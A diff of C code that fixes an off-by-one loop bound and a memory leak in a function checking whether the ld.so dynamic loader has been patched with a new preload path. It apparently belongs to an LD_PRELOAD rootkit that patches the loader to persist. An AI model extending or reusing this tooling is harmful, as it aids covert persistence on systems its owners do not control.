@@ -1,7 +1,8 @@
 /* searches one ld.so path from ldfind for newpreload.
  * returns 1 if ld.so has been patched.
  * return 0 if it has not.
- * returns -1 on error. */
+ * returns -1 on error.
+ * nothing uses these right now, but that could change. */
 int _ispatched(const char *path, const char *newpreload){
     unsigned char *buf;
     FILE *ofp;
@@ -10,7 +11,6 @@ int _ispatched(const char *path, const char *newpreload){
 
     hook(CFOPEN, CFWRITE);
 
-    // bindup ignores links.
     ofp = call(CFOPEN, path, "rb");
     if(ofp == NULL) return -1;
     fsize = getfilesize(path)/2;
@@ -26,7 +26,7 @@ int _ispatched(const char *path, const char *newpreload){
         memset(buf, 0, fsize+1);
         n = fread(buf, 1, fsize, ofp);
         if(n){
-            for(int i = 0; i <= fsize; i++){
+            for(int i = 0; i < fsize; i++){
                 if(buf[i] == newpreload[count]){
                     if(count == plen)
                         break;
@@ -34,6 +34,7 @@ int _ispatched(const char *path, const char *newpreload){
                 }else count=0;
             }
         }else n = 0;
+        free(buf);
     }while(n > 0 && count != plen);
 
     if(count != plen)
@@ -41,8 +42,6 @@ int _ispatched(const char *path, const char *newpreload){
 
     return 1;
 }
-
-
 int ispatched(const char *newpreload){
     char **foundld;
     int allf, p, is=0;
